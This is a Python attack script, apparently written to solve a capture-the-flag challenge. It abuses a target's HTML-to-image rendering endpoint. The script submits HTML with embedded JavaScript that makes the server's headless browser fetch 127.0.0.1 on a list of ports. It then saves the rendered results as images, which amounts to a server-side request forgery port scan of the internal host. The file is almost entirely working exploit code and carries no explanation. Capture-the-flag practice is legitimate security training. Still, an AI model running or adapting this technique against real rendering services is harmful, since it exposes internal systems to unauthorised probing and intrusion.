import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=60)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/s3_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes OK')
                return True
            print(f'{name}: [{r.status_code}] {r.text[:120]}')
            return False
        except Exception as e:
            time.sleep(2)
    return False

# Scan with 127.0.0.1 across a WIDER range + confirm 40003, and read /bridge listing again for other sockets
js = r'''<!doctype html><html><head><style>body{font-family:monospace;font-size:14px;white-space:pre-wrap;padding:10px}</style></head><body><div id=o>scanning...</div><script>
var out=document.getElementById('o');
var results={};
function upd(){var s='';var ks=Object.keys(results).sort();for(var i=0;i<ks.length;i++){s+=ks[i]+" => "+results[ks[i]]+"\n";}out.textContent=s;}
var ports=[40003,38560,38561,38562,38563,38564,38565,38566,38567];
ports.forEach(function(port){
  var ctrl=new AbortController();
  var t=setTimeout(function(){ctrl.abort();},4000);
  fetch("http://127.0.0.1:"+port+"/status",{signal:ctrl.signal})
    .then(function(r){return r.text();})
    .then(function(tx){clearTimeout(t);results[port]="LIVE "+tx.substring(0,70);upd();})
    .catch(function(e){clearTimeout(t);results[port]="dead:"+e.name;upd();});
});
</script></body></html>'''
render(js, 'scan127')
